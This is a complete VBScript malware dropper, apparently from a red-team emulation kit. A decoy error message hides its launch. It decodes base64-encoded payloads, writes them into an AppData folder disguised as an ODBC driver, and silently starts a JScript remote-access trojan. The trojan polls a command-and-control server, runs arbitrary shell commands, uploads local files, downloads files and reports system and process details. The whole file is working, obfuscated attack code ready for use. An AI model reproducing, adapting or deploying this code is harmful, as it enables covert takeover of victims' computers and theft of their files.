Function decodebase64(encodedScript)
	payloadWithHeader = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		encodedScript & "</B64DECODE>"
	Set xmlObject = CreateObject("MSXML2.DOMDocument.3.0")
	xmlObject.LoadXML(payloadWithHeader)
	decodebase64 = xmlObject.selectsinglenode("B64DECODE").nodeTypedValue
	set xmlObject = nothing
End Function

Function main()
    ' decode 2nd stage VBS scripts
	encodedStarter = "//4nACAAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAZQB4AGUAYwB1AHQAZQBzACAAYQAgAHMAdABhAGcAZQAgADEAIABSAEEAVAANAAoAJwAgAFQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGIAYQBzAGUAZAAgAG8AbgAgACIAcwB0AGEAcgB0AGUAcgAuAHYAYgBzACIAIAAoAFMASABBAC0AMgA1ADYAOgAgADIANwAwAGEANwA3ADYAYwBiADkAOAA1ADUAZgAyADcANAA1ADIAYgAzADUAZgAwADcAMgBhAGYAZgBiAGIAYwA2ADUAMAAyADMAZAA0AGIAYgAxAGYAMgAyAGUAMABjADMAMAAxAGEAZgBkADIAMgA3ADYAZQA3AGMANQBlAGEAKQANAAoADQAKACcAIABHAGUAdAAgAHQAaABlACAAYQBiAHMAbwBsAHUAdABlACAAcABhAHQAaAAgAHQAbwAgAHQAaABlACAAYwAyAHMAYwByAGkAcAB0AA0ACgBTAGUAdAAgAHMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkADQAKAGEAcABwAEQAYQB0AGEARgBvAGwAZABlAHIAIAA9ACAAcwBoAGUAbABsAC4ARQB4AHAAYQBuAGQARQBuAHYAaQByAG8AbgBtAGUAbgB0AFMAdAByAGkAbgBnAHMAKAAiACUAYQBwAHAAZABhAHQAYQAlACIAKQANAAoAYwAyAHMAYwByAGkAcAB0ACAAPQAgACIAXABcAFQAcgBhAG4AcwBCAGEAcwBlAE8AZABiAGMARAByAGkAdgBlAHIAXABcAFQAcgBhAG4AcwBCAGEAcwBlAE8AZABiAGMARAByAGkAdgBlAHIALgBqAHMAIgANAAoAcABhAHQAaABUAG8AQwAyAHMAYwByAGkAcAB0ACAAPQAgAGEAcABwAEQAYQB0AGEARgBvAGwAZABlAHIAIAArACAAYwAyAHMAYwByAGkAcAB0AA0ACgANAAoAJwAgAGUAeABlAGMAdQB0AGUAIAB0AGgAZQAgAEMAMgAgAHMAYwByAGkAcAB0AA0ACgBjAG8AbQBtAGEAbgBkACAAPQAgACIAYwBtAGQALgBlAHgAZQAgAC8AawAgAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAgACIAIgAiACAAJgAgAHAAYQB0AGgAVABvAEMAMgBzAGMAcgBpAHAAdAAgACYAIAAiACIAIgAiAA0ACgBTAGUAdAAgAHMAaABlAGwAbAAgAD0AIABXAFMAYwByAGkAcAB0AC4AQwByAGUAYQB0AGUATwBiAGoAZQBjAHQAKAAiAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAIgApAA0ACgBzAGgAZQBsAGwALgBSAHUAbgAgAGMAbwBtAG0AYQBuAGQALAAgADAALAAgAHQAcgB1AGUADQAKAFMAZQB0ACAAcwBoAGUAbABsACAAPQAgAE4AbwB0AGgAaQBuAGcA"
	encodedRAT = "Ly8gVGhpcyBzY3JpcHQgcHJvdmlkZXMgYXR0YWNrZXJzIHJlbW90ZSBhY2Nlc3MgdG8gaW5mZWN0ZWQgc3lzdGVtcyB2aWEgdGhlIEhUVFAvUyBwcm90b2NvbA0KLy8gVGhpcyBzY3JpcHQgaXMgYmFzZWQgb24gImdnbGRyIiAvICJCZWxsSG9wIiAvIFRyYW5zQmFzZU9kYmNEcml2ZXIuanMgKFNIQS0yNTY6IDMxM2UzODc1NmI4MDc1NTA3ODg1NWZlMGYxZmZlYTJlYTBkNDdkZmZmY2JlMmQ2ODdhYWE4YmRiMzdjODkyZjQpDQoNCmZ1bmN0aW9uIEdldENvbXB1dGVySW5mb3JtKCkgew0KICAgIHZhciBuZXR3b3JrID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuTmV0d29yaycpOw0KICAgIHZhciBvdXRwdXQgPSAiIjsNCiAgICBvdXRwdXQgKz0gIlxuQ29tcHV0ZXIgbmFtZTogIiArIG5ldHdvcmsuY29tcHV0ZXJOYW1lOw0KICAgIG91dHB1dCArPSAiXG5Eb21haW46ICIgKyBuZXR3b3JrLnVzZXJEb21haW47DQogICAgb3V0cHV0ICs9ICJcblVzZXJuYW1lOiAiICsgbmV0d29yay51c2VyTmFtZTsNCiAgICANCg0KICAgIHZhciBjcHVBcmNoID0gR2V0T2JqZWN0KCJ3aW5tZ210czpyb290XFxjaW12MjpXaW4zMl9Qcm9jZXNzb3I9J2NwdTAnIikuQWRkcmVzc1dpZHRoOw0KICAgIG91dHB1dCArPSAiXG5PUy1iaXQ6ICIgKyBjcHVBcmNoOw0KDQogICAgdmFyIG9ialdNSVNlcnZpY2UgPSBHZXRPYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9uTGV2ZWw9aW1wZXJzb25hdGV9IVxcXFwuXFxyb290XFxjaW12MiIpOw0KICAgIHZhciBjb2xJdGVtcyA9IG9ialdNSVNlcnZpY2UuRXhlY1F1ZXJ5KCJzZWxlY3QgKiBmcm9tIFdpbjMyX09wZXJhdGluZ1N5c3RlbSIpOw0KICAgIHZhciBlbnVtSXRlbXMgPSBuZXcgRW51bWVyYXRvcihjb2xJdGVtcyk7DQogICAgZm9yICg7ICFlbnVtSXRlbXMuYXRFbmQoKTsgZW51bUl0ZW1zLm1vdmVOZXh0KCkpIHsNCiAgICAgICAgdmFyIG9iakl0ZW0gPSBlbnVtSXRlbXMuaXRlbSgpOw0KICAgICAgICBvdXRwdXQgKz0gIlxuT1MgTmFtZTogIiArIG9iakl0ZW0uTmFtZTsNCiAgICAgICAgb3V0cHV0ICs9ICJcblZlcnNpb246ICIgKyBvYmpJdGVtLlZlcnNpb247DQogICAgICAgIG91dHB1dCArPSAiXG5TZXJ2aWNlIFBhY2s6ICIgKyBvYmpJdGVtLlNlcnZpY2VQYWNrTWFqb3JWZXJzaW9uICsgIi4iICsgb2JqSXRlbS5TZXJ2aWNlUGFja01pbm9yVmVyc2lvbjsNCiAgICAgICAgb3V0cHV0ICs9ICJcbk9TIE1hbnVmYWN0dXJlcjogIiArIG9iakl0ZW0uTWFudWZhY3R1cmVyOw0KICAgICAgICBvdXRwdXQgKz0gIlxuV2luZG93cyBEaXJlY3Rvcnk6ICIgKyBvYmpJdGVtLldpbmRvd3NEaXJlY3Rvcnk7DQogICAgICAgIG91dHB1dCArPSAiXG5Mb2NhbGU6ICIgKyBvYmpJdGVtLkxvY2FsZTsNCiAgICAgICAgb3V0cHV0ICs9ICJcbkF2YWlsYWJsZSBQaHlzaWNhbCBNZW1vcnk6ICIgKyBvYmpJdGVtLkZyZWVQaHlzaWNhbE1lbW9yeTsNCiAgICAgICAgb3V0cHV0ICs9ICJcblRvdGFsIFZpcnR1YWwgTWVtb3J5OiAiICsgb2JqSXRlbS5Ub3RhbFZpcnR1YWxNZW1vcnlTaXplOw0KICAgICAgICBvdXRwdXQgKz0gIlxuQXZhaWxhYmxlIFZpcnR1YWwgTWVtb3J5OiAiICsgb2JqSXRlbS5GcmVlVmlydHVhbE1lbW9yeTsNCiAgICB9DQogICAgcmV0dXJuIG91dHB1dDsNCn0NCg0KZnVuY3Rpb24gR2V0Q29tcFByb2Nlc3MoKXsNCiAgICB2YXIgb3V0cHV0ID0gIiI7DQogICAgdmFyIG9ialdNSVNlcnZpY2UgPSBHZXRPYmplY3QoIndpbm1nbXRzOntpbXBlcnNvbmF0aW9uTGV2ZWw9aW1wZXJzb25hdGV9IVxcXFwuXFxyb290XFxjaW12MiIpOw0KICAgIHZhciBjb2xJdGVtcyA9IG9ialdNSVNlcnZpY2UuRXhlY1F1ZXJ5KCJzZWxlY3QgKiBmcm9tIFdpbjMyX1Byb2Nlc3MiKTsNCiAgICB2YXIgZW51bUl0ZW1zID0gbmV3IEVudW1lcmF0b3IoY29sSXRlbXMpOw0KICAgIGZvciAoOyAhZW51bUl0ZW1zLmF0RW5kKCk7IGVudW1JdGVtcy5tb3ZlTmV4dCgpKXsNCiAgICAgICAgdmFyIG9iakl0ZW0gPSBlbnVtSXRlbXMuaXRlbSgpOw0KICAgICAgICBvdXRwdXQgKz0gIlxuIiArIG9iakl0ZW0uTmFtZTsNCiAgICB9DQogICAgcmV0dXJuIG91dHB1dDsNCn0NCg0KLy8gY3JlYXRlR1VJRCBjcmVhdGVzIGEgR1VJRCB1c2VkIHRvIHVuaXF1ZWx5IGlkZW50aWZ5IHRoZSBDMiBzZXNzaW9uIHRvIHRoZSBjMiBzZXJ2ZXINCmZ1bmN0aW9uIGNyZWF0ZUdVSUQoKXsNCiAgICBndWlkID0gTWF0aC5yYW5kb20oKS50b1N0cmluZygzNikuc3Vic3RyaW5nKDIsIDEwKSArIE1hdGgucmFuZG9tKCkudG9TdHJpbmcoMzYpLnN1YnN0cmluZygyLCAxMCk7DQogICAgcmV0dXJuIGd1aWQ7DQp9DQoNCi8vIGdldFRhc2tpbmcgZ2V0cyB0YXNrcyBmcm9tIHRoZSByZWQgdGVhbSBDMiBzZXJ2ZXINCmZ1bmN0aW9uIGdldFRhc2tpbmcodXJsLCBndWlkKXsNCiAgICB2YXIgaHR0cFJlcSA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNU3htbDIuU2VydmVyWE1MSFRUUC42LjAiKQ0KICAgIGh0dHBSZXEuc2V0T3B0aW9uKDIsIDEzMDU2KTsgLy8gaWdub3JlIFRMUyBjZXJ0IGVycm9ycw0KICAgIGh0dHBSZXEub3BlbigiUE9TVCIsIHVybCwgZmFsc2UpDQogICAgdmFyIHByb3h5ID0gZ2V0UHJveHkoKTsNCiAgICBpZiAocHJveHkgIT0gIiIpew0KICAgICAgICBodHRwUmVxLnNldFByb3h5KDIsIHByb3h5LCAiIik7DQogICAgfQ0KICAgIGh0dHBSZXEuc2V0UmVxdWVzdEhlYWRlcigiVXNlci1hZ2VudCIsICJNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgMi4zLjM7IHpoLXR3OyBIVEMgUHlyYW1pbmQgQnVpbGQvR1JJNDApIEFwcGxlV2ViS2l0LzUzMy4xIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgTW9iaWxlIFNhZmFyaS81MzMuMSIpOw0KICAgIGh0dHBSZXEuc2VuZChndWlkKTsNCiAgICBjb21tYW5kID0gaHR0cFJlcS5yZXNwb25zZVRleHQ7DQogICAgcmV0dXJuIGNvbW1hbmQ7DQoNCn0NCg0KLy8gc2VuZFRhc2tPdXRwdXQgc2VuZHMgdGFzayBvdXRwdXQgdG8gdGhlIHJlZCB0ZWFtIEMyIHNlcnZlcg0KZnVuY3Rpb24gc2VuZFRhc2tPdXRwdXQodXJsLCBjbWRPdXRwdXQsIGd1aWQpew0KICAgIHZhciBodHRwUmVxID0gbmV3IEFjdGl2ZVhPYmplY3QoIk1TeG1sMi5TZXJ2ZXJYTUxIVFRQLjYuMCIpDQogICAgaHR0cFJlcS5zZXRPcHRpb24oMiwgMTMwNTYpOyAvLyBpZ25vcmUgVExTIGNlcnQgZXJyb3JzDQogICAgaHR0cFJlcS5vcGVuKCJQT1NUIiwgdXJsLCBmYWxzZSkNCiAgICB2YXIgcHJveHkgPSBnZXRQcm94eSgpOw0KICAgIGlmIChwcm94eSAhPSAiIil7DQogICAgICAgIGh0dHBSZXEuc2V0UHJveHkoMiwgcHJveHksICIiKTsNCiAgICB9DQogICAgaHR0cFJlcS5zZXRSZXF1ZXN0SGVhZGVyKCJVc2VyLWFnZW50IiwgIk1vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCAyLjMuMzsgemgtdHc7IEhUQyBQeXJhbWluZCBCdWlsZC9HUkk0MCkgQXBwbGVXZWJLaXQvNTMzLjEgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBNb2JpbGUgU2FmYXJpLzUzMy4xIik7DQogICAgaHR0cFJlcS5zZW5kKGNtZE91dHB1dCk7DQogICAgY29tbWFuZCA9IGh0dHBSZXEucmVzcG9uc2VUZXh0Ow0KICAgIHJldHVybiBjb21tYW5kOw0KfQ0KDQovLyBkb3dubG9hZEZpbGUgZG93bmxvYWRzIGEgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgQzIgc2VydmVyIGFuZCB3cml0ZXMgaXQgdG8gZGlzaw0KZnVuY3Rpb24gZG93bmxvYWRGaWxlKHVybCwgZmlsZURlc3RpbmF0aW9uKSB7DQogICAgdXJsID0gTEhPU1QgKyB1cmw7DQogICAgdmFyIE9iamVjdCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdNU3htbDIuU2VydmVyWE1MSFRUUC42LjAnKTsNCiAgICBPYmplY3Quc2V0T3B0aW9uKDIsIDEzMDU2KTsgLy8gaWdub3JlIFRMUyBjZXJ0IGVycm9ycw0KICAgIE9iamVjdC5vcGVuKCJHRVQiLCB1cmwsIGZhbHNlKTsNCiAgICB2YXIgcHJveHkgPSBnZXRQcm94eSgpOw0KICAgIGlmIChwcm94eSAhPSAiIil7DQogICAgICAgIE9iamVjdC5zZXRQcm94eSgyLCBwcm94eSwgIiIpOw0KICAgIH0NCiAgICBPYmplY3Quc2V0UmVxdWVzdEhlYWRlcigiVXNlci1hZ2VudCIsICJNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgMi4zLjM7IHpoLXR3OyBIVEMgUHlyYW1pbmQgQnVpbGQvR1JJNDApIEFwcGxlV2ViS2l0LzUzMy4xIChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgTW9iaWxlIFNhZmFyaS81MzMuMSIpOw0KICAgIE9iamVjdC5zZW5kKCk7DQoNCiAgICAvLyBjcmVhdGUgRGF0YSBTdHJlYW0NCiAgICB2YXIgU3RyZWFtID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoJ0FET0RCLlN0cmVhbScpOw0KDQogICAgLy8gcHJlcGFyZSB0aGUgc3RyZWFtIGZvciB3cml0aW5nIGRhdGENCiAgICBTdHJlYW0uT3BlbigpOw0KICAgIFN0cmVhbS5UeXBlID0gMTsgLy8gYWRUeXBlQmluYXJ5DQogICAgU3RyZWFtLldyaXRlKE9iamVjdC5yZXNwb25zZUJvZHkpOw0KICAgIFN0cmVhbS5Qb3NpdGlvbiA9IDA7DQogICAgDQogICAgLy8gY3JlYXRlIGFuIGVtcHR5IHRhcmdldCBmaWxlOyBvdmVyd3JpdGUgaWYgZmlsZSBleGlzdHMNCiAgICB2YXIgRmlsZSA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCdTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCcpOw0KICAgIGlmIChGaWxlLkZpbGVFeGlzdHMoZmlsZURlc3RpbmF0aW9uKSkNCiAgICB7DQogICAgICAgIEZpbGUuRGVsZXRlRmlsZShmaWxlRGVzdGluYXRpb24pOw0KICAgIH0NCg0KICAgIC8vIHdyaXRlIGRvd25sb2FkZWQgZmlsZSB0byBkaXNrDQogICAgU3RyZWFtLlNhdmVUb0ZpbGUoZmlsZURlc3RpbmF0aW9uLCAyKTsgLy8gYWRTYXZlQ3JlYXRlT3ZlcldyaXRlDQogICAgU3RyZWFtLkNsb3NlKCk7DQp9DQoNCi8vIHVwbG9hZEZpbGUNCmZ1bmN0aW9uIHVwbG9hZEZpbGUodXJsLCBpbkZpbGUpIHsNCiAgICAvLyByZWFkIGZpbGUNCiAgICB2YXIgZmlsZU9iamVjdCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOw0KICAgIGZpbGVPdXRwdXQgPSBmaWxlT2JqZWN0Lk9wZW5UZXh0RmlsZShpbkZpbGUpOw0KICAgIGZpbGVEYXRhID0gZmlsZU91dHB1dC5SZWFkQWxsKCk7DQogICAgZmlsZU91dHB1dC5DbG9zZSgpOw0KDQogICAgdXJsID0gTEhPU1QgKyB1cmw7DQogICAgdmFyIE9iamVjdCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdNU3htbDIuU2VydmVyWE1MSFRUUC42LjAnKTsNCiAgICBPYmplY3Quc2V0T3B0aW9uKDIsIDEzMDU2KTsgLy8gaWdub3JlIFRMUyBjZXJ0IGVycm9ycw0KICAgIE9iamVjdC5vcGVuKCJQT1NUIiwgdXJsLCBmYWxzZSk7DQogICAgdmFyIHByb3h5ID0gZ2V0UHJveHkoKTsNCiAgICBpZiAocHJveHkgIT0gIiIpew0KICAgICAgICBPYmplY3Quc2V0UHJveHkoMiwgcHJveHksICIiKTsNCiAgICB9DQogICAgT2JqZWN0LnNldFJlcXVlc3RIZWFkZXIoIlVzZXItYWdlbnQiLCAiTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDIuMy4zOyB6aC10dzsgSFRDIFB5cmFtaW5kIEJ1aWxkL0dSSTQwKSBBcHBsZVdlYktpdC81MzMuMSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIE1vYmlsZSBTYWZhcmkvNTMzLjEiKTsNCiAgICBPYmplY3Quc2VuZChmaWxlRGF0YSk7DQp9DQoNCi8vIGdldFJhbmRvbUZpbGUgZ2VuZXJhdGVzIGFuIGFic29sdXRlIHBhdGggdG8gYSByYW5kb20gZmlsZSBpbiB0aGUgdXNlciB0ZW1wIGRpcmVjdG9yeTsgbm8gZmlsZXMgYXJlIGNyZWF0ZWQgaW4gdGhpcyBmdW5jdGlvbg0KZnVuY3Rpb24gZ2V0UmFuZG9tRmlsZSgpew0KICAgIHZhciBmaWxlT2JqZWN0ID0gbmV3IEFjdGl2ZVhPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0Iik7DQogICAgcmFuZG9tRmlsZSA9IGZpbGVPYmplY3QuR2V0U3BlY2lhbEZvbGRlcigyKSArICJcXCIgKyBmaWxlT2JqZWN0LkdldFRlbXBOYW1lKCk7DQogICAgcmV0dXJuIHJhbmRvbUZpbGU7DQp9DQovLyBleGVjU2hlbGxDb21tYW5kIGV4ZWN1dGVzIHRhc2tpbmdzIHNwZWNpZmllZCBieSByZWQgdGVhbSBvbiB0aGUgQzIgc2VydmVyOyBjb21tYW5kIG91dHB1dCBpcyByZWRpcmVjdGVkIHRvIGEgcmFuZG9tIGZpbGUNCmZ1bmN0aW9uIGV4ZWNTaGVsbENvbW1hbmQoY29tbWFuZCwgcmFuZG9tRmlsZSl7DQogICAgaWYgKGNvbW1hbmQubGVuZ3RoID09IDApew0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICB2YXIgc2hlbGwgPSBuZXcgQWN0aXZlWE9iamVjdCgiV1NjcmlwdC5TaGVsbCIpOw0KICAgIHMgPSBjb21tYW5kLnNwbGl0KCIgIikNCiAgICBpZiAoc1swXSA9PSAiZG93bmxvYWQiKSB7DQogICAgICAgIGRvd25sb2FkRmlsZShzWzFdLCBzWzJdKTsNCiAgICAgICAgY21kV2l0aFJlZGlyZWN0ID0gIiVjb21zcGVjJSAvQyBlY2hvICdbK10gVXBsb2FkIENvbXBsZXRlJyA+ICIgKyByYW5kb21GaWxlICsgIiAyPiYxIjsNCiAgICAgICAgc2hlbGwuUnVuKGNtZFdpdGhSZWRpcmVjdCwgMCwgdHJ1ZSk7DQogICAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYgKHNbMF0gPT0gInVwbG9hZCIpew0KICAgICAgICB1cGxvYWRGaWxlKHNbMV0sIHNbMl0pOw0KICAgICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmIChzWzBdID09ICJlbnVtLXN5c3RlbSIpIHsNCiAgICAgICAgc3lzaW5mbyA9IEdldENvbXB1dGVySW5mb3JtKCk7DQogICAgICAgIHN5c2luZm8gKz0gR2V0Q29tcFByb2Nlc3MoKTsNCiAgICAgICAgdmFyIEZTTyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOw0KICAgICAgICBmaWxlSGFuZGxlID0gRlNPLk9wZW5UZXh0RmlsZShyYW5kb21GaWxlLCAyLCB0cnVlKTsNCiAgICAgICAgZmlsZUhhbmRsZS5Xcml0ZUxpbmUoc3lzaW5mbyk7DQogICAgICAgIGZpbGVIYW5kbGUuQ2xvc2UoKTsNCiAgICAgICAgcmV0dXJuOw0KDQogICAgfSBlbHNlIHsNCiAgICAgICAgLy8gY2FsbCBkb3dubG9hZCBmdW5jdGlvbiBwYXNzaW5nIHVybCBhbmQgZmlsZSBkZXN0aW5hdGlvbg0KICAgICAgICBjbWRXaXRoUmVkaXJlY3QgPSAiJWNvbXNwZWMlIC9DICIgKyBjb21tYW5kICsgIiA+ICIgKyByYW5kb21GaWxlICsgIiAyPiYxIjsNCiAgICAgICAgLy9XU2NyaXB0LkVjaG8oY21kV2l0aFJlZGlyZWN0KQ0KICAgICAgICBzaGVsbC5SdW4oY21kV2l0aFJlZGlyZWN0LCAwLCB0cnVlKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCn0NCg0KLy8gZ2V0Q29tbWFuZE91dHB1dCByZWFkcyB0aGUgcmFuZG9tIGZpbGUgY29udGFpbmluZyBjb21tYW5kIGxpbmUgb3V0cHV0DQpmdW5jdGlvbiBnZXRDb21tYW5kT3V0cHV0KHJhbmRvbUZpbGUpew0KICAgIHZhciBmaWxlT2JqZWN0ID0gbmV3IEFjdGl2ZVhPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0Iik7DQogICAgZmlsZU91dHB1dCA9IGZpbGVPYmplY3QuT3BlblRleHRGaWxlKHJhbmRvbUZpbGUpOw0KICAgIGNtZE91dHB1dCA9IGZpbGVPdXRwdXQuUmVhZEFsbCgpOw0KICAgIGZpbGVPdXRwdXQuQ2xvc2UoKTsNCiAgICBmaWxlT2JqZWN0LkRlbGV0ZUZpbGUocmFuZG9tRmlsZSk7DQogICAgcmV0dXJuIGNtZE91dHB1dDsNCn0NCg0KLy8gZ2V0UHJveHkgcXVlcmllcyB0aGUgV2luZG93cyByZWdpc3RyeSB0byBvYnRhaW4gUHJveHkgc2VydmVyIGluZm9ybWF0aW9uDQpmdW5jdGlvbiBnZXRQcm94eSgpew0KICAgIHZhciBXc2hTaGVsbCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJXU2NyaXB0LlNoZWxsIik7DQogICAgdmFyIFByb3h5RW5hYmxlID0gV3NoU2hlbGwuUmVnUmVhZCgiSEtFWV9DVVJSRU5UX1VTRVJcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxJbnRlcm5ldCBTZXR0aW5nc1xcUHJveHlFbmFibGUiKTsNCiAgICBpZiAoUHJveHlFbmFibGUgPT0gMSl7DQogICAgICAgIHZhciBQcm94eVNlcnZlciA9IFdzaFNoZWxsLlJlZ1JlYWQoIkhLRVlfQ1VSUkVOVF9VU0VSXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcSW50ZXJuZXQgU2V0dGluZ3NcXFByb3h5U2VydmVyIik7DQogICAgICAgIHJldHVybiBQcm94eVNlcnZlcjsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gIiI7DQogICAgfQ0KfQ0KDQovLyBzbGVlcCBjYXVzZXMgdGhlIHByb2dyYW0gdG8gcGF1c2UgZm9yIGEgcGVyaW9kIHNwZWNpZmljZWQgYnkgc2xlZXBJbnRlcnZhbA0KZnVuY3Rpb24gc2xlZXAoKXsNCiAgICBtaW4gPSAxOw0KICAgIG1heCA9IDM7DQogICAgaml0dGVyID0gTWF0aC5yb3VuZChNYXRoLnJhbmRvbSgpKihtYXgtbWluKSttaW4pOw0KICAgIHNsZWVwSW50ZXJ2YWwgPSA1MDAqMypqaXR0ZXI7DQogICAgLy9XU2NyaXB0LkVjaG8oc2xlZXBJbnRlcnZhbCk7DQogICAgV1NjcmlwdC5TbGVlcChzbGVlcEludGVydmFsKTsNCn0NCg0KLy8gbWFpbg0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICAvLyBnZXQgdGhlIEMyIHNlcnZlciBJUCBhZGRyZXNzIHZpYSBjb21tYW5kIGxpbmUgYXJndW1lbnQNCiAgICB0cnkgew0KICAgICAgICBMSE9TVCA9IFdTY3JpcHQuQXJndW1lbnRzLkl0ZW0oMCkNCiAgICB9IGNhdGNoIChlKSB7DQogICAgICAgIExIT1NUID0gImh0dHBzOi8vMTkyLjE2OC4wLjQvIg0KICAgIH0NCiAgICANCiAgICAvLyBzZXR1cCBVUkxzIGFuZCBzZXNzaW9uIEdVSUQNCiAgICByZWdpc3RlclVSTCA9IExIT1NUICsgInJlZ2lzdGVyLmh0bWwiDQogICAgdGFza1VSTCA9IExIT1NUICsgInRhc2suaHRtbCI7DQogICAgb3V0cHV0VVJMID0gTEhPU1QgKyAib3V0cHV0Lmh0bWwiOw0KICAgIGd1aWQgPSBjcmVhdGVHVUlEKCk7DQogICANCiAgICAvLyBtYWluIGNvbW1hbmQgbG9vcDsgY2hlY2sgZm9yIHRhc2tpbmcsIGV4ZWN1dGUgdGFza2luZywgc2VuZCBvdXRwdXQgdG8gQzIgc2VydmVyDQogICAgd2hpbGUgKHRydWUpIHsNCiAgICAgICAgc2xlZXAoKTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIC8vV1NjcmlwdC5FY2hvKCJHZXR0aW5nIHRhc2tpbmcgZnJvbSBDMiBzZXJ2ZXIiKQ0KICAgICAgICAgICAgY29tbWFuZCA9IGdldFRhc2tpbmcodGFza1VSTCwgZ3VpZCk7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICAgIC8vIFdTY3JpcHQuRWNobyhlLmRlc2NyaXB0aW9uKQ0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGNvbW1hbmQubGVuZ3RoID09IDApIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgIHJhbmRvbUZpbGUgPSBnZXRSYW5kb21GaWxlKCk7DQogICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAvLyBXU2NyaXB0LkVjaG8oIkV4ZWN1dGluZyBjb21tYW5kIikNCiAgICAgICAgICAgIGV4ZWNTaGVsbENvbW1hbmQoY29tbWFuZCwgcmFuZG9tRmlsZSk7DQogICAgICAgICAgICBjbWRPdXRwdXQgPSBnZXRDb21tYW5kT3V0cHV0KHJhbmRvbUZpbGUpOw0KICAgICAgICB9Y2F0Y2ggKGUpIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAvLyBXU2NyaXB0LkVjaG8oIlNlbmRpbmcgY29tbWFuZCBvdXRwdXQgdG8gdGhlIEMyIHNlcnZlciIpDQogICAgICAgICAgICBzZW5kVGFza091dHB1dChvdXRwdXRVUkwsIGNtZE91dHB1dCwgZ3VpZCk7DQogICAgICAgICAgICBjbWRPdXRwdXQgPSAiIg0KICAgICAgICB9Y2F0Y2ggKGUpIHsNCiAgICAgICAgICAgIC8vIFdTY3JpcHQuRWNobyhlLmRlc2NyaXB0aW9uKQ0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCm1haW4oKTs="
	decodedStarter = decodebase64(encodedStarter)
	decodedRAT = decodebase64(encodedRAT)
    
	' get path to AppData folder
	Set shell = CreateObject("WScript.Shell")
	appDataFolder = shell.ExpandEnvironmentStrings("%appdata%")
	payloadFolder = appDataFolder + "\\TransbaseOdbcDriver"

	' create folder to hold payload files
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	filesystem.CreateFolder(payloadFolder)

    ' write decoded scripts to AppData\Roaming\TransbaseOdbcDriver\
	starterScript = payloadFolder + "\\starter.vbs"
	Set streamObject = CreateObject("ADODB.Stream")
	streamObject.Type = 1
	streamObject.Open
	streamObject.Write decodedStarter
	streamObject.SaveToFile starterScript, 2

	httpRAT = payloadFolder + "\\TransBaseOdbcDriver.js"
	Set streamObject = CreateObject("ADODB.Stream")
	streamObject.Type = 1
	streamObject.Open
	streamObject.Write decodedRAT
	streamObject.SaveToFile httpRAT, 2

	' Execute starter.vbs, which starts http-rat.js
	shell.run starterScript, 0, true
    
End Function
' need to drop files:
MsgBox "Unable to decrypt message.", 16, "Error"
main